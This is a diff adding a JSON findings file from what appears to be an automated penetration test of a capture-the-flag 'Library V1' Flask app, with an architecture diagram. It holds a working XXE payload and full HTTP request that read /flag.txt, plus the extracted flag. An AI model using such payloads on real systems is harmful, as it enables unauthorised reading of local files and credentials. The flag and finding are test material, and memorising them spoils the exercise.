@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:32:10.287295+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "3a48aaba-94cf-4e1f-bea6-84286435ef59",
+      "timestamp": "2026-04-12T21:32:10.287152+00:00",
+      "title": "XXE Injection in /addbook XML Parser - CTF Flag Extracted",
+      "severity": "critical",
+      "target": "http://172.17.0.1:37911/addbook",
+      "description": "The /addbook endpoint parses XML input without disabling external entity processing. An attacker can inject an XXE payload to read arbitrary local files. The CTF flag was extracted from /flag.txt via XXE injection through the xml POST parameter.",
+      "evidence": "XXE payload sent to POST /addbook (xml= parameter):\n\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]>\n<Book><Title>&xxe;</Title><ISBN>123</ISBN><Editor>J</Editor><Publisher>P</Publisher><Chapters/></Book>\n\nResponse body contained:\n<Book><Title>flag{71ecc5af-ad20-40ec-8733-50b0a19f705c}\n</Title><ISBN>123</ISBN>...</Book>\n\nFLAG: flag{71ecc5af-ad20-40ec-8733-50b0a19f705c}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "POST /addbook HTTP/1.1\\nHost: 172.17.0.1:37911\\nContent-Type: application/x-www-form-urlencoded\\n\\nxml=<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///flag.txt\">]><Book><Title>&xxe;</Title><ISBN>123</ISBN><Editor>J</Editor><Publisher>P</Publisher><Chapters/></Book>",
+        "expected": "Response contains flag{71ecc5af-ad20-40ec-8733-50b0a19f705c}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "c9936d00-5cf0-4f76-a26d-b5892ac20062",
+      "timestamp": "2026-04-12T21:32:18.792687+00:00",
+      "title": "Library V1 Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser / Attacker\"] --> Port37911[\"HTTP :37911 (Flask/Werkzeug 3.1.8)\"]\n  Port37911 --> HomeRoute[\"/  - Home page with XML example\"]\n  Port37911 --> AddBookRoute[\"/addbook - POST XML input\"]\n  AddBookRoute --> XMLParser[\"XML Parser (no entity restriction)\"]\n  XMLParser --> FileSystem[\"Local Filesystem\"]\n  FileSystem --> FlagFile[\"/flag.txt - flag{71ecc5af-...}\"]\n  FileSystem --> EtcPasswd[\"/etc/passwd\"]\n  XMLParser --> ResultPage[\"Result page - reflects parsed XML content\"]"
+    }
+  ]
+}
